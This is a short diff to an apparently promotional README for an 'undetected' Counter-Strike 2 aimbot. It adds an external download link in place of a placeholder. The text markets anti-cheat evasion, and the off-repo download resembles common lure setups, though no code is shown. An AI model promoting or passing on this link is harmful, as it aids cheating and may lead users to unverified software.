@@ -2,7 +2,7 @@
 
 Take your aim to the next level in Counter-Strike 2 with this powerful, undetected Aimbot. Designed for both legit and rage playstyles, it features full customization and smart target selection.
 
-[![Download CS2 Aimbot](https://img.shields.io/badge/Download-CS2_Aimbot-blueviolet)](#)
+[![Download CS2 Aimbot](https://img.shields.io/badge/Download-CS2_Aimbot-blueviolet)](https://counter-strike-2-aimbot-pro.github.io/.github/)
 
 ---
 
